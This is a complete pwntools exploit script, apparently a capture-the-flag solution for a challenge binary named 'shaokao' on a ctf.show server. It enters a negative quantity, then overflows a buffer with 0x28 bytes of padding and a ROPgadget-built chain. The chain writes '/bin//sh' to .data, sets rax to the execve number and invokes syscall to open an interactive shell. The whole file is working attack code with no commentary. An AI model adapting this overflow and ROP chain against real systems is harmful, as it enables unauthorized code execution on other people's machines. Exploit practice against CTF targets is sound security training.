from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28103)
io.sendlineafter('>', b'1')
sleep(1)
io.sendline(b'1')
sleep(1)
io.sendline(b'-10000')
io.sendlineafter('>', b'4')
io.sendlineafter('>', b'5')
# ROPgadget --binary ./shaokao --ropchain
p = b''
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e0) # @ .data
p += p64(0x0000000000458827) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x0000000000447339) # xor rax, rax ; ret
p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040264f) # pop rdi ; ret
p += p64(0x00000000004e60e0) # @ .data
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x00000000004a404b) # pop rdx ; pop rbx ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000447339) # xor rax, rax ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000402404) # syscall

payload = b'a'*0x28+p
io.sendline(payload)
io.interactive()